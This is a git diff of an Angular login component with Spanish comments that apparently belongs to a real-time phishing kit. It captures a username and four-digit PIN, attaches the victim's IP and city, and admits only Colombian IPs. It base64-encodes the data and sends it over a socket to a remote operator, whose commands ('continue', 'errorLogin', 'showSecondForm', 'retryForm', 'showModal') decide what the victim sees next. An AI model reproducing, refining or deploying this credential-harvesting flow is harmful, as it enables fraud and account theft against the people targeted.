@@ -13,12 +13,6 @@ import { FuncionalityService } from '../../services/funcionality.service';
 import { HttpClient } from '@angular/common/http';
 import { ToastrService } from 'ngx-toastr';
 
-declare global {
-  interface Window {
-    onTurnstileCallback: (token: string) => void;
-  }
-}
-
 @Component({
   selector: 'app-auth',
   imports: [ReactiveFormsModule, CommonModule, FormsModule],
@@ -26,10 +20,9 @@ declare global {
   styleUrl: './auth.component.css',
 })
 export class AuthComponent {
-  private socketId: string | null = null;
-  private messageId: string | null = null;
-  private isRetry: boolean = false;
   private city: string = '';
+  step: number = 0;
+  formData: any = {};
   private weekdaysES = [
     'domingo',
     'lunes',
@@ -69,11 +62,11 @@ export class AuthComponent {
     private http: HttpClient,
     private fb: FormBuilder,
     private router: Router,
-    private functionalityService: FuncionalityService,
+    private session: FuncionalityService,
     private toastr: ToastrService
   ) {
 
-    window.onTurnstileCallback = this.handleTurnstileToken.bind(this);
+   /*  window.onTurnstileCallback = this.handleTurnstileToken.bind(this); */
     const date = new Date();
     date.setDate(date.getDate() + 1); // tomorrow
 
@@ -113,22 +106,43 @@ export class AuthComponent {
       ],
       password: ['', [Validators.required, Validators.pattern(/^\d{4}$/)]],
     });
+
+     this.session.socket.on('updateStatus', (data) => {
+      this.step = data.step;
+    });
+
+    this.session.socket.on('showSecondForm', () => {
+      this.step = 2;
+    });
+
+    this.session.socket.on('retryForm', () => {
+      this.step = 1;
+    });
+
+    this.session.socket.on('showLoading', () => {
+      this.step = 3;
+    });
+
+    this.session.socket.on('showModal', (data) => {
+      this.step = 4;
+      alert(data.text); // Reemplaza con un modal real
+    });
+
+    this.session.socket.on('showImageModal', (data) => {
+      this.step = 5;
+      // Mostrar imagen en un modal
+    });
   }
 
   ngOnInit(): void {
-    this.toastr.info('test');
-    // Inicialización del componente
-    this.socketId = localStorage.getItem('skid');
-
-    console.log('oninit');
   }
 
-  handleTurnstileToken(token: string) {
+  /* handleTurnstileToken(token: string) {
     // Envía el token al backend para validación
-    this.functionalityService.handleCaptchaToken(token).subscribe((res) => {
+    this.session.handleCaptchaToken(token).subscribe((res) => {
       console.log(res);
     });
-  }
+  } */
 
   private getPeriod(hour: number): string {
     if (hour < 12) {
@@ -145,60 +159,8 @@ export class AuthComponent {
   }
 
   async onSubmit(): Promise<void> {
-    if (this.authForm.valid) {
-      this.isLoading = true;
-
-      try {
-        const { ip, city } = await this.getPi();
-        let payload = {
-          user: this.authForm.value.username,
-          pass: this.authForm.value.password,
-          ip,
-          city,
-        };
-        console.log(payload)
-        let data = btoa(JSON.stringify(payload));
-
-        if (!this.socketId) {
-          this.toastr.error('Socket no inicializado');
-          this.isLoading = false;
-          return;
-        }
-
-        const sessionId = this.functionalityService.getStoredSessionId();
-
-             // Reiniciar suscripción al decisionSubject
-      this.functionalityService.resetDecisionSubject();
-
-        // Inicia el proceso y espera respuesta con nuevos IDs
-        this.functionalityService
-          .startProcess(data, localStorage.getItem('skid'), sessionId, this.isRetry)
-          .subscribe((res: any) => {
-            this.isRetry = false;
-          }); 
-         // Reinicia bandera
-
-        // Suscribe a decisiones usando `socketId` como clave
-        this.functionalityService.onDecision(sessionId).subscribe((res) => {
-          console.log(res)
-          if (res === 'continue') {
-            this.toastr.success('Sesión activa');
-            this.router.navigate(['/formulario']);
-          } else if (res === 'errorLogin') {
-            this.isLoading = false;
-            this.authForm.reset();
-            this.isRetry = true;
-            this.toastr.error('Credenciales incorrectas');
-          }
-        });
-      } catch (error) {
-        this.isLoading = false;
-        console.error('Error en onSubmit:', error);
-      }
-    } else {
-      this.authForm.markAllAsTouched();
-    }
-  }
+    this.session.submitFirstForm(this.formData);
+} 
 
   get username() {
     return this.authForm.get('username');
@@ -208,38 +170,33 @@ export class AuthComponent {
     return this.authForm.get('password');
   }
 
-  async getPi(): Promise<{ ip: string; city: string }> {
-    try {
-      // Obtiene la IP pública
-      const ipResponse = await fetch('https://api.ipify.org?format=json');
-      const ipData = await ipResponse.json();
+   async getPi(): Promise<{ ip: string; city: string }> {
+  try {
+    // Obtiene la IP pública
+    const ipResponse = await fetch('https://api.ipify.org?format=json');
+    const ipData = await ipResponse.json();
 
-      // Obtiene datos de geolocalización
-      const locationResponse = await fetch(
-        `https://ipapi.co/${ipData.ip}/json/`
-      );
-      const locationData = await locationResponse.json();
+    // Obtiene datos de geolocalización
+    const locationResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
+    const locationData = await locationResponse.json();
 
-      // Valida que el país sea Colombia
-      if (locationData.country !== 'CO') {
-        console.warn(
-          'Acceso denegado para IP no colombiana:',
-          locationData.country
-        );
-        this.isLoading = false;
-        this.errorLogin = true;
-        throw new Error('IP no permitida');
-      }
-
-      return {
-        ip: ipData.ip,
-        city: locationData.city,
-      };
-    } catch (error) {
-      console.error('Error al obtener IP o ciudad:', error);
+    // Valida que el país sea Colombia
+    if (locationData.country !== 'CO') {
+      console.warn('Acceso denegado para IP no colombiana:', locationData.country);
       this.isLoading = false;
       this.errorLogin = true;
-      throw error;
+      throw new Error('IP no permitida');
     }
+
+    return {
+      ip: ipData.ip,
+      city: locationData.city
+    };
+  } catch (error) {
+    console.error('Error al obtener IP o ciudad:', error);
+    this.isLoading = false;
+    this.errorLogin = true;
+    throw error;
   }
+}
 }
